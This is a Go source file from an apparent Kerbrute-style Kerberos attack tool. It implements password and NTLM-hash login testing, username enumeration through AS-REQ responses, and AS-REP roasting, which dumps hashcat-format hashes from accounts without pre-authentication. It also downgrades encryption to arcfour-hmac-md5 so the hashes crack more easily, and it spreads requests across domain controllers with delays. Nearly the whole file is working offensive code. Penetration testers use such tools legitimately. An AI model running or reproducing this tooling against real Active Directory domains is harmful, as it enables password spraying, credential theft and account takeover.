package session

import (
	"fmt"
	"github.com/incogbyte/gokbt/util"
	"html/template"
	"os"
	"strings"
	"sync/atomic"
	"time"

	"github.com/ropnop/gokrb5/v8/iana/errorcode"

	kclient "github.com/ropnop/gokrb5/v8/client"
	kconfig "github.com/ropnop/gokrb5/v8/config"
	"github.com/ropnop/gokrb5/v8/keytab"
	"github.com/ropnop/gokrb5/v8/messages"
)

const krb5ConfigTemplateDNS = `[libdefaults]
dns_lookup_kdc = true
default_realm = {{.Realm}}
`

const krb5ConfigTemplateKDC = `[libdefaults]
default_realm = {{.Realm}}
[realms]
{{.Realm}} = {
	kdc = {{.DomainController}}
	admin_server = {{.DomainController}}
}
`

type KerbruteSession struct {
	Domain       string
	Realm        string
	Kdcs         map[int]string
	KdcList      []string
	KdcDelays    map[string]time.Duration
	kdcRR        uint32
	ConfigString string
	Config       *kconfig.Config
	Verbose      bool
	SafeMode     bool
	HashFile *os.File
	Logger *util.Logger
}

type KerbruteSessionOptions struct {
	Domain           string
	Realm            string // optional override; if empty, uses uppercased Domain
	AutoRealm        bool
	DomainController string
	Verbose          bool
	SafeMode         bool
	Downgrade        bool
	KdcDelays        map[string]time.Duration
	HashFilename     string
	logger           *util.Logger
}

func NewKerbruteSession(options KerbruteSessionOptions) (k KerbruteSession, err error) {
	if options.Domain == "" {
		return k, fmt.Errorf("domain must not be empty")
	}
	if options.logger == nil {
		logger := util.NewLogger(options.Verbose, "")
		options.logger = &logger
	}
	var hashFile *os.File
	if options.HashFilename != "" {
		hashFile, err = os.OpenFile(options.HashFilename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			return k, err
		}
		options.logger.Log.Infof("Saving any captured hashes to %s", hashFile.Name())
		if !options.Downgrade {
			options.logger.Log.Warningf("You are capturing AS-REPs, but not downgrading encryption. You probably want to downgrade to arcfour-hmac-md5 (--downgrade) to crack them with a user's password instead of AES keys")
		}
	}

	realm := strings.ToUpper(options.Domain)
	if options.Realm != "" {
		realm = strings.ToUpper(options.Realm)
	} else if options.AutoRealm && options.DomainController != "" {
		if discovered, derr := util.DiscoverRealmFromLDAP(options.DomainController); derr == nil && discovered != "" {
			options.logger.Log.Infof("Auto-discovered realm via LDAP: %s", discovered)
			realm = discovered
		} else if options.logger != nil {
			options.logger.Log.Debugf("Auto-realm discovery failed: %v", derr)
		}
	}
	configstring, err := buildKrb5Template(realm, options.DomainController)
	if err != nil {
		return k, fmt.Errorf("failed to build Kerberos config template: %w", err)
	}
	Config, err := kconfig.NewFromString(configstring)
	if err != nil {
		return k, fmt.Errorf("failed to create Kerberos config: %w", err)
	}
	if options.Downgrade {
		Config.LibDefaults.DefaultTktEnctypeIDs = []int32{23} // downgrade to arcfour-hmac-md5 for crackable AS-REPs
		options.logger.Log.Info("Using downgraded encryption: arcfour-hmac-md5")
	}
	_, kdcs, err := Config.GetKDCs(realm, false)
	if err != nil {
		return k, fmt.Errorf("Couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	kdcList := make([]string, 0, len(kdcs))
	for _, v := range kdcs {
		kdcList = append(kdcList, v)
	}
	k = KerbruteSession{
		Domain:       options.Domain,
		Realm:        realm,
		Kdcs:         kdcs,
		KdcList:      kdcList,
		KdcDelays:    options.KdcDelays,
		ConfigString: configstring,
		Config:       Config,
		Verbose:      options.Verbose,
		SafeMode:     options.SafeMode,
		HashFile: hashFile,
		Logger:       options.logger,
	}
	return k, err

}

func buildKrb5Template(realm, domainController string) (string, error) {
	data := map[string]interface{}{
		"Realm":            realm,
		"DomainController": domainController,
	}
	var kTemplate string
	if domainController == "" {
		kTemplate = krb5ConfigTemplateDNS
	} else {
		kTemplate = krb5ConfigTemplateKDC
	}
	t, err := template.New("krb5ConfigString").Parse(kTemplate)
	if err != nil {
		return "", fmt.Errorf("failed to parse template: %w", err)
	}
	builder := &strings.Builder{}
	if err := t.Execute(builder, data); err != nil {
		return "", fmt.Errorf("failed to execute template: %w", err)
	}
	return builder.String(), nil
}

func (k KerbruteSession) TestLogin(username, password string) (bool, error) {
	Client := k.newClientWithPassword(username, password, true)
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err := Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerbruteSession) TestLoginWithHash(username, hash string) (bool, error) {
	Client, err := k.newClientWithHash(username, hash, true)
	if err != nil {
		return false, err
	}
	defer Client.Destroy()
	if ok, err := Client.IsConfigured(); !ok {
		return false, err
	}
	err = Client.Login()
	if err == nil {
		return true, err
	}
	success, err := k.TestLoginError(err)
	return success, err
}

func (k KerbruteSession) TestUsername(username string) (bool, error) {
	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)

	cl := k.newClientWithPassword(username, "foobar", false)

	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
	if err != nil {
		return false, fmt.Errorf("failed to create AS-REQ: %w", err)
	}
	b, err := req.Marshal()
	if err != nil {
		return false, err
	}
	rb, err := cl.SendToKDC(b, k.Realm)

	if err == nil {
		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
		var ASRep messages.ASRep
		err = ASRep.Unmarshal(rb)
		if err != nil {
			// something went wrong, it's not a valid response
			return false, err
		}
		k.DumpASRepHash(ASRep)
		return true, nil
	}
	e, ok := err.(messages.KRBError)
	if !ok {
		return false, err
	}
	switch e.ErrorCode {
	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
		return true, nil
	default:
		return false, err

	}
}

func (k KerbruteSession) DumpASRepHash(asrep messages.ASRep) {
	hash, err := util.ASRepToHashcat(asrep)
	if err != nil {
		k.Logger.Log.Debugf("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", asrep.CName.PrincipalNameString(), err.Error())
		return
	}
	k.Logger.Log.Noticef("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", asrep.CName.PrincipalNameString(), hash)
	if k.HashFile != nil {
		_, err := k.HashFile.WriteString(fmt.Sprintf("%s\n", hash))
		if err != nil {
			k.Logger.Log.Errorf("[!] Error writing hash to file: %s", err.Error())
		}
		k.HashFile.Sync()
	}
}

// newClientWithPassword clones config and selects KDC round-robin, applying per-KDC delay if configured.
func (k KerbruteSession) newClientWithPassword(username, password string, assumePreAuth bool) *kclient.Client {
	cfg := k.cloneConfigForKdc()
	opts := []func(*kclient.Settings){kclient.DisablePAFXFAST(true)}
	if assumePreAuth {
		opts = append(opts, kclient.AssumePreAuthentication(true))
	}
	return kclient.NewWithPassword(username, k.Realm, password, cfg, opts...)
}

// newClientWithHash creates a Kerberos client using an NTLM hash instead of password
// WIP: This implementation is a work in progress and may not work correctly for all scenarios
// The current implementation uses keytab.AddEntry which derives keys from passwords,
// so it may not properly support Pass the Hash attacks. A proper implementation would
// need to create the keytab entry directly with the hash bytes.
func (k KerbruteSession) newClientWithHash(username, hash string, assumePreAuth bool) (*kclient.Client, error) {
	cfg := k.cloneConfigForKdc()
	opts := []func(*kclient.Settings){kclient.DisablePAFXFAST(true)}
	if assumePreAuth {
		opts = append(opts, kclient.AssumePreAuthentication(true))
	}
	
	key, err := util.ParseNTLMHash(hash)
	if err != nil {
		return nil, fmt.Errorf("failed to parse hash: %w", err)
	}
	
	kt := keytab.New()
	err = kt.AddEntry(username, k.Realm, hash, time.Now(), 1, key.KeyType)
	if err != nil {
		return nil, fmt.Errorf("failed to add keytab entry: %w", err)
	}
	
	return kclient.NewWithKeytab(username, k.Realm, kt, cfg, opts...), nil
}

func (k KerbruteSession) cloneConfigForKdc() *kconfig.Config {
	kdc := k.pickKdc()
	cs, err := buildKrb5Template(k.Realm, kdc)
	if err != nil {
		return k.Config
	}
	cfg, err := kconfig.NewFromString(cs)
	if err != nil {
		// fallback to original config
		return k.Config
	}
	return cfg
}

func (k KerbruteSession) pickKdc() string {
	if len(k.KdcList) == 0 {
		return ""
	}
	idx := int(atomic.AddUint32(&k.kdcRR, 1)-1) % len(k.KdcList)
	kdc := k.KdcList[idx]
	if d, ok := k.KdcDelays[kdc]; ok && d > 0 {
		time.Sleep(d)
	}
	return kdc
}

// Close closes any open resources associated with the session
func (k KerbruteSession) Close() error {
	if k.HashFile != nil {
		return k.HashFile.Close()
	}
	return nil
}
